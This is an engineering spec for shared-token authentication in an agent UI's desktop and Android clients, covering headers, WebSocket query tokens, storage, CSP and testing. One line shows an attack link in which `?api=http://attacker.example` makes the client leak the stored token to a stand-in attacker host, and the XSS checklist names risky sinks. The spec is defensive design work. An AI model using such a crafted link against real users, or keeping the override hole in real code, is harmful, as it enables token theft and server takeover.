# Client handoff: shared-token authentication

Status: **server implementation complete**. This spec covers the desktop and
Android clients. It describes the implemented contract; no further server
changes are required for the client work below.

All endpoint paths are relative to the server root.

## Why

The server used to trust anything that could reach it over WireGuard. That
turned out to be too weak: a web page open in a browser on a peer device can
reach the server through that browser. Origin and Host checks now stop web
pages, and a shared token makes the API require a secret as well.

## Decisions already made

- There is **one token per server**, not per device or per user. The server
  generates it on first start in `~/.config/agent-ui-server/token`. Generated
  tokens are 43 URL-safe characters (`A-Z a-z 0-9 - _`); a hand-written one
  may be any string of at least 32 characters.
- The user copies the token into each client **once, by hand**, through a
  settings field. There is no pairing or login endpoint, and the server never
  sends the token to anyone.
- Every API request and every WebSocket needs the token. Only the desktop
  client's static files (served from the same origin via `WEB_ROOT`) load
  without it, so the page can start and ask for it.
- Rotating the token means deleting the file and restarting the server.
  Every client then gets `401` until the user enters the new token.

## Rollout order: clients first

A server with auth enabled rejects clients that don't send the token. The
old server ignores both the `Authorization` header and an unknown `token`
query parameter, so **ship the client changes first**, have the user enter
the token, and only then deploy the server.

## Server contract

### REST

Send the token on every request:

```http
Authorization: Bearer <token>
```

The scheme is case-insensitive; the token must match exactly. A missing or
wrong token gets:

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer

Missing or invalid token
```

The body is plain text, not the usual FastAPI `{"detail": ...}` JSON, because
the request is refused before it reaches the API. Check the status code
before parsing the body.

This applies to every API route: `/agents`, `/usage`, `/sandbox-paths`,
`/projects`, `/sessions`, `/worktrees` and everything under them. A query
parameter token is **not** accepted on REST.

`GET /agents` is the cheapest authenticated request and has no side effects.
Use it to check a token (see "Validate on save" below).

### WebSockets

Both `/ws/sessions/{id}` and `/ws/sessions/{id}/files` need the token. There
are two ways to send it:

- **Header** (Android/OkHttp and any client that can set headers):
  `Authorization: Bearer <token>` on the handshake request.
- **Query parameter** (browsers, which cannot set headers on a WebSocket):
  `?token=<token>`, **URL-encoded** with `encodeURIComponent(token)`.
  Generated tokens need no encoding, but a hand-written one may contain
  characters that do, e.g. an unencoded `+` arrives as a space.

The server removes `token` from the query string before the endpoint or the
access log sees it. Other query parameters are unaffected.

A handshake with a missing or wrong token is refused with HTTP `403`, the same
response as for a foreign `Origin` or `Host` or a nonexistent session. Browsers
don't expose the status: the socket just fires `error` and then `close` with
code `1006`. **A client cannot tell an auth failure from other failures on the
socket itself.** When a socket fails to open, call `GET /agents` with the same
token:

| `GET /agents` result | Meaning | Client action |
|---|---|---|
| `401` | Token missing or wrong | Show the token prompt (see below); do not keep reconnecting |
| `200` | Token is fine; the socket failed for another reason | Existing handling (e.g. stale session, back-off reconnect) |
| Network error | Server unreachable | Existing offline handling |

### Other checks already in place

These predate this change but affect client development:

- `Host` must be the server's bind address or a name in its
  `ALLOWED_HOSTS`, or requests get `400`. A client reaching the server by a
  new hostname needs that name added on the server.
- A browser WebSocket's `Origin` must be exactly `http://<allowed
  host>:<port>`. A desktop client running from a dev server on another port is
  refused. Proxy WebSockets through the dev server, or serve the build from the
  API's origin.
- Non-browser clients send no `Origin`, which is accepted.

## Client requirements

### Both clients

1. **Settings field "Server token".** A password-style text input with
   show/hide, next to the server address if the client has one. Trim
   surrounding whitespace before saving; pasted tokens often carry a trailing
   newline.
2. **Validate on save.** Call `GET /agents` with the new token. Save it on
   `200`, show "Token rejected" on `401`, and show the usual network error
   otherwise. Offer "save anyway" only for the network-error case.
3. **Send it everywhere.** Every REST call and every WebSocket connect,
   including reconnects. Put this in the shared HTTP/WebSocket layer rather
   than at call sites, so new endpoints get it automatically.
4. **First run and 401s.** With no token stored, go straight to the token
   prompt instead of making requests that will fail. On any `401` (or a
   WebSocket failure confirmed as auth by the table above), show the token
   prompt with an explanation such as "The server rejected the token. It may
   have been changed on the server." Keep the old token until a new one is
   saved, and stop reconnect loops while the prompt is open.
5. **Never log or display the token** outside the settings field. That
   includes debug logs, error reports, and WebSocket URLs shown in
   diagnostics.
6. **No token in shareable state.** Don't include the token in exported
   settings, deep links, or anything the user might paste somewhere.

### Desktop client (browser)

- **Storage:** `localStorage`, under a single key such as
  `agentUi.serverToken`. `localStorage` is per origin, so reaching the server
  by IP and by hostname are two origins and need the token entered twice.
  This is expected.
- **REST:** add the `Authorization` header in the shared fetch wrapper.
- **WebSocket:** `new WebSocket(`${base}/ws/sessions/${id}?token=${encodeURIComponent(token)}`)`.
  Keep any existing query parameters.
- **Required: honour `?api=` only for pages opened from disk.** Today
  `js/api.js` takes `?api=` from any page URL as the base for every REST call
  and WebSocket. Once the client sends the token, a link such as
  `http://10.0.0.1:8000/?api=http://attacker.example` loads the real client
  from the real server, and it then sends the stored token to the attacker in
  every `Authorization` header and WebSocket URL. Use the override only when
  `location.protocol === 'file:'` (the development case it exists for), and
  ignore it otherwise. Ship this in the same change that adds the token, not
  later.
- **XSS is now the main risk to the token and to the server.** Any script that
  runs in this page can read the token, and can also drive the API directly.
  Because the page shows agent output, tool results and file contents, which
  the agent may have copied from untrusted sources, check that:
  - No agent-, file- or server-supplied text reaches `innerHTML`,
    `outerHTML`, `insertAdjacentHTML`, `document.write` or a framework's
    raw-HTML escape hatch (`dangerouslySetInnerHTML`, `v-html`, `{@html}`)
    without going through a sanitizer such as DOMPurify.
  - Markdown rendering either disables raw HTML or sanitizes its output.
  - Links built from agent output can't use `javascript:` URLs.
- **Content-Security-Policy:** add a CSP to `index.html` as a
  `<meta http-equiv="Content-Security-Policy">` tag, as strict as the build
  allows. A starting point:

  ```text
  default-src 'self'; script-src 'self'; connect-src 'self';
  img-src 'self' data:; style-src 'self' 'unsafe-inline';
  object-src 'none'; base-uri 'none'; form-action 'self'
  ```

  `connect-src 'self'` covers same-origin `ws://` in current browsers. If a
  target browser blocks the socket, add the explicit `ws://host:port`. Drop
  `'unsafe-inline'` from `style-src` if the build doesn't need it. Never add
  `'unsafe-inline'` or `'unsafe-eval'` to `script-src`. Check the browser
  console for CSP violations across every screen before shipping.

### Android client

- **Storage:** app-private storage (DataStore or SharedPreferences).
  Exclude it from cloud backup and device transfer
  (`android:dataExtractionRules` / `android:fullBackupContent`), so a restored
  backup doesn't carry the secret to another device.
- **REST and WebSocket:** an OkHttp `Interceptor` that adds
  `Authorization: Bearer <token>` covers both, since OkHttp's WebSocket
  handshake goes through the same client. Don't use the query parameter.
- **Entering the token:** a paste-friendly field is enough, since users can
  copy it from a password manager or scan a QR code shown with
  `qrencode -t ansiutf8 < ~/.config/agent-ui-server/token` using the camera
  app. An in-app
  "Scan QR" button is optional and can come later.

## Testing checklist

- Fresh install with no token: the token prompt appears, and no API requests
  are made before a token is saved.
- Correct token: everything works, including reconnects after a server
  restart.
- Wrong token on save: "Token rejected", and nothing is saved.
- Token rotated on the server while the client runs: REST and WebSocket
  failures lead to the prompt, not an endless reconnect loop.
- Desktop: a hand-written token containing `+`, `/` and `=` works over the
  WebSocket.
- Desktop: no CSP violations in the console on any screen.
- The token appears in no client log output.
